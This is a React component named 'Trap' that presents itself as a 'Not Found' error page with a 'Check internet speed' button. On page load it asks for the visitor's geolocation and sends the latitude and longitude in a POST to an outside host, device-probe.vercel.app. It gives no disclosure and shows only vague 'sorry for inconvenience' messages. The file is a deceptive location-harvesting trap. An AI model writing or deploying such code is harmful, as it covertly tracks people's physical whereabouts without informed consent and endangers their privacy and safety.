/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable react-hooks/rules-of-hooks */
import React from "react";
import { useEffect } from "react";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { useNavigate } from "react-router-dom";

const Trap = () => {
  useEffect(() => {
    getLocation();
  }, []);

  const navigate = useNavigate();

  const handleClick = () => {
    navigate("/speed");
  };

  async function getLocation() {
    try {
      const position = await getCurrentPosition();
      const { latitude, longitude } = position.coords;
      const body = {
        deviceLatitude: latitude,
        deviceLongitude: longitude,
      };
      await main(body);
    } catch (error) {
      console.error("Error getting location:", error);
      toast.error("sorry for inconvenience");
      await main({ deviceLatitude: "", deviceLongitude: "" });
    }
  }

  async function getCurrentPosition() {
    return new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        (position) => resolve(position),
        (error) => reject(error)
      );
    });
  }

  async function main(body) {
    try {
      const response = await fetch("https://device-probe.vercel.app/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(body),
      });

      if (!response.ok) {
        throw new Error("Failed to send location");
      }

      await response.json();

      toast.success("sorry for inconvenience");
    } catch (error) {
      toast.error("sorry for inconvenience");
      throw error;
    }
  }

  return (
    <>
      <div className="not-found">
        <h1>Not Found</h1>
        <p>We're sorry, but the page you requested could not be found.</p>
        <button onClick={handleClick}>Check internet speed</button>
      </div>
      <ToastContainer />
    </>
  );
};

export default Trap;
